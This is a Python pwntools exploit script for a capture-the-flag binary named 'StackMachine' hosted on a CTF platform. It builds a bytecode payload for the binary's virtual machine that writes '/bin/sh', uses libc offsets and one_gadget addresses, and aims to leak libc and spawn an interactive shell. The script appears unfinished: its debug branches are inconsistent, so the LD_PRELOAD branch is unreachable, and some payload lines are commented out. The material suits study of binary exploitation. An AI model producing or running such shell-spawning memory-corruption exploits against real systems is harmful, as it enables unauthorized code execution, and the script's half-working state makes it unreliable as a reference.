#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 2
elf = ELF('./StackMachine')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./StackMachine')
elif debug == 2:
    libc = ELF('./libc.so.6')
    p = process('./StackMachine',env={'LD_PRELOAD':'./libc.so.6'})
else:
    libc = ELF('./libc.so.6')
    p = remote('f.buuoj.cn',20173)

def AllocStack(sz):
    p.sendlineafter("stack size >",str(sz))

def AllocData(sz,data):
    p.sendlineafter("data size >",str(sz))
    p.recvuntil("initial data >")
    p.sendline(data)

def AllocCode(sz,code):
    p.sendlineafter("code size >",str(sz))
    p.recvuntil("tial code >")
    p.sendline(code)

def exp():
    #leak libc
    AllocStack(0xff000)
    main_addr = 0x401346
    offset = 0
    gdb.attach(p,'b *0x400b9e\nb* 0x400a7a')
    AllocData(0x23000,p64(0x3858f0)+"/bin/sh\x00")
    payload = p8(0xe)+p64(0)
    payload += p8(1)
    payload += p8(0xe)+p64(0x14af38)
    payload += p8(1)
    payload += p8(4)
    payload += p8(0xe)+p64(0x14af38)
    payload += p8(2)
    payload += p8(0xe)+"/bin/sh\x00"
    payload += p8(0xe)+p64(0x14af38-0x600)
    payload += p8(2)
    #payload += p8(0xe)+p64(main_addr)
    #payload += p8(0xe)+p64(0x23000-8)
    #payload += p8(2)
    #payload += p8(0xe)+p64(main_addr)

    AllocCode(0x1000,payload)
    p.interactive()

exp()
